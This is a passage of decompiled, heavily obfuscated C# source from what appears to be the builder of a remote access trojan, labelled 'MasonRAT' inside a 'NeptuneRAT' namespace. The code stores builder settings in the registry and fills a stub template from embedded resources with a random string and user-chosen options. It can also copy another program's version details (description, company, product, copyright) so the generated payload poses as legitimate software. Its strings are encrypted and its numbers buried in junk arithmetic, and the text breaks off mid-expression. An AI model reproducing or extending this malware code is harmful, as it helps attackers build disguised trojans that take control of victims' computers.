          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1762), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1763), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1764));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1765), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1766), (object) this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ);
        if (this.\u2694️MasonRAT\u270Cٽ\u060Aژ\u060Aڝٺ\u060A\u0608ۙـ\u060Aۏٸــۧ\u0609\u0609.Checked)
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1767), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1768), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1769));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1770), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1771), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1772));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string masonRatد̍دﻻـﮪ̍ڟــۡى = NeptuneRAT.My.Resources.Resources.\u2694️MasonRAT\u270C\u0609د\u060A\u060B̍د\u060Aﻻـﮪ̍ڟـ\u060Aـۡى;
      string str = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1773);
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      int num = 1;
      do
      {
        int index = random.Next(0, str.Length);
        char ch = str[index];
        stringBuilder.Append(ch);
        checked { ++num; }
      }
      while (num <= (622414443 + 1375998934 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + -(791990224 + 1206423137 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0);
      string newValue = stringBuilder.ToString();
      string Expression1 = masonRatد̍دﻻـﮪ̍ڟــۡى.Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1774), newValue).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1775), this.\u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609.Text);
      string Expression2 = (!this.\u2694️MasonRAT\u270Cٽ\u060Aژ\u060Aڝٺ\u060A\u0608ۙـ\u060Aۏٸــۧ\u0609\u0609.Checked ? Expression1.Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1779), this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E.Text).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1780), this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Text) : Microsoft.VisualBasic.Strings.Replace(Expression1, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1776), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1777), Count: (991379139 - ~472918959 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > ~2133786975 - 1185798870 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ? 415337892 - (1661351573 >> 1613917122) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 : 11461803 - (1467110946 >> 578665511) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1778), this.\u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D.Text)).Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1781), this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Text);
      if (this.\u2694️MasonRAT\u270Cٽـڅـڦ\u0609ﯧد\u060F\u060Bــۙـٺ\u060Bاـ.Checked)
        Expression2 = Microsoft.VisualBasic.Strings.Replace(Expression2, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1782), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1783), Count: (-527667689 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - -((527667707 ^ 20) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0));
      if (this.\u2694️MasonRAT\u270C\u0608\u060Cـحڠٺ\u060A\u060Aـٺ\u060Aڙح\u0609ؤ.Checked)
        Expression2 = Microsoft.VisualBasic.Strings.Replace(Expression2, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1784), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1785), Count: (1875906697 ^ 1441330483 >> 1385353681) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - ((1322319186 ^ 1355759328 >> 1690603656) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 | (711847845 ^ (1201971961 | 68773634)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1));
      if (this.\u2694️MasonRAT\u270Cٺڣٺ\u060Fٺ\u0609̍\u060B\u060Eۨ\u060Dڕ.Checked)
        Expression2 = Microsoft.VisualBasic.Strings.Replace(Expression2, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1786), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1787), Count: ((1635992596 | 723347933) - 1805610481 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 817033497 - 817033478 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0);
      if (this.\u2694️MasonRAT\u270Cـ̍ﮪ\u060Cـ\u060B\u0608ــ\u0609\u0609ۙ̍\u060B\u0609\u0609دة.Checked)
        Expression2 = Microsoft.VisualBasic.Strings.Replace(Expression2, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1788), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1789), Count: (~425653957 - 535700140 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - -(183011441 + (1160668305 << 1077272840) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1));
      if (this.\u2694️MasonRAT\u270Cٽـټ\u060A\u0020ٸـ\u060E\u0608ـۡــ̍\u060D.Checked)
        Expression2 = Microsoft.VisualBasic.Strings.Replace(Expression2, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1790), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1791 /*0x06FF*/), Count: (53641582 - 53641597 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ (7217 ^ 947818228 >> 506530353) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0);
      string Code;
      if (this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked)
      {
        FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609);
        Code = Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Microsoft.VisualBasic.Strings.Replace(Expression2, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1792 /*0x0700*/), versionInfo.FileDescription, Count: ((-2039942674 ^ -1555340970) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ((978120523 > 1163082524 ? 830783734 : 623087801) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 >> 1760826507 - 1235684331 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1793), versionInfo.Comments, Count: -876072304 - 390645327 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + (1861558604 + ~594840973 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % ((2065818058 ^ 1256976953 >> 1119047293) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1794), versionInfo.CompanyName, Count: 1408673323 - 380390594 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + ~(-1162619193 - (755588446 | 2103976978) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1795), versionInfo.ProductName, Count: ((-1968102762 ^ (289817013 | 1967840643)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ 2108689828 - 1515349493 % 1274802678 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 >> 1900205153 - 707919338 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1796), versionInfo.LegalCopyright, Count: (1237080927 + -1277941916 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 1555505286 - 1228617376 + 